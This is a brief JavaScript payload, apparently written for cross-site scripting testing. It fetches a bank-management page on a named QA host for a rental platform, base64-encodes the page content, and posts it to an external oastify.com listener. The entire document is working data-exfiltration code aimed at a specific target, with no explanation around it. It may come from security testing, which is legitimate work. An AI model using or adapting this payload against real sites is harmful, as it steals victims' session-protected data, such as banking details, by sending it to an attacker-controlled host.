function fe(t) { 
    fetch(t)
        .then(t => t.text())
        .then(t => { 
            fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: "p=" + btoa(t)
            });
        });
}

urls = ["https://leaderbank.qa.zrent.net/Landlord/ManageBanks"];
urls.forEach(fe);
